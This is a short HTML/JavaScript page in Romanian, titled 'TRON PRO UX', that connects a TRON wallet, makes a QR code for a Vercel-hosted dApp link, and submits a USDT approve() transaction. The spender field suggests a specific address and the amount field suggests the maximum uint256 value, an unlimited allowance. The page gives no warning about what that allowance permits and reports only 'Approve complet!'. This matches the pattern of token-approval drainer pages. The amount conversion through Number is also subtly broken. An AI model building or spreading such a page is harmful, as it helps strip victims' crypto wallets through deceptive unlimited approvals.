<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>TRON PRO UX</title>

<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

<style>
body{font-family:system-ui;margin:20px;background:#f7f9fc}
.card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
pre{background:#f3f4f6;padding:10px;border-radius:8px}
.ok{background:#d1fae5;padding:6px;border-radius:999px;display:inline-block}
.bad{background:#fee2e2;padding:6px;border-radius:999px;display:inline-block}
canvas{margin-top:10px}
</style>
</head>

<body>

<div class="card">
<h2>TRON PRO UX FINAL</h2>

<div id="status" class="bad">Wallet: Deconectat</div>
<p><b id="addr">—</b></p>

<button onclick="connect()">Connect Wallet</button>
</div>

<div class="card">
<h3>QR dApp</h3>
<button onclick="genQR()">Generează QR</button>
<canvas id="qr"></canvas>
<pre id="link"></pre>
</div>

<div class="card">
<h3>TRC20 APPROVE (USDT)</h3>

<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
<input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>

<button onclick="approve()">Approve USDT</button>

<pre id="out"></pre>
</div>

<script>

const USDT = "TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
let addr = null;

/* =====================
   DETECT WALLET
===================== */
function connect(){
  if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
    alert("Deschide pagina în Trust Wallet / TronLink dApp browser");
    return;
  }

  addr = window.tronWeb.defaultAddress.base58;

  document.getElementById("addr").innerText = addr;
  document.getElementById("status").innerHTML = "Wallet: <b>Conectat</b>";
  document.getElementById("status").className = "ok";
}

/* =====================
   QR GENERATOR (REAL FLOW)
===================== */
function genQR(){

  const url = "https://d-app-lake-theta.vercel.app";

  QRCode.toCanvas(document.getElementById("qr"), url);

  document.getElementById("link").innerText = url;
}

/* =====================
   CONTRACT HELPER
===================== */
async function getContract(){
  return await window.tronWeb.contract().at(USDT);
}

/* =====================
   APPROVE FUNCTION
===================== */
async function approve(){
  try{

    const spender = document.getElementById("spender").value;
    const amount = document.getElementById("amount").value;

    if(!spender || !amount){
      document.getElementById("out").innerText = "Completează câmpurile";
      return;
    }

    // USDT 6 decimals
    const value = BigInt(Math.floor(Number(amount) * 1e6));

    const c = await getContract();

    document.getElementById("out").innerText =
      "Așteaptă semnătura în wallet...";

    const tx = await c.approve(spender, value.toString()).send();

    document.getElementById("out").innerText =
      "Approve complet!\nTX: " + tx;

  }catch(e){
    document.getElementById("out").innerText =
      "Tranzacție anulată sau eroare wallet";
  }
}

</script>

</body>
</html>
